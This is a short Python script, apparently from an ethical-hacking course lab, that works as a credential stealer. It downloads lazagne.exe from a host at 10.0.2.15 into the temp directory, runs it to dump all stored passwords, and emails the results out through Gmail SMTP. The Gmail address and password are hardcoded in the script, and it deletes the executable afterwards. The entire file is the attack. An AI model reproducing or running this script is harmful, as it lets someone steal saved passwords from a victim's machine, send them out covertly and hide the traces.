#!/usr/bin/env python
import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    filename = url.split("/")[-1]
    with open(filename, "wb") as output_file:
        output_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("http://10.0.2.15/evil-files/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("johnnybelly1324@gmail.com", "B7JRvOQuD8amwIlHKBghR7osQx895pMInzYdO17d", result)
os.remove("lazagne.exe")
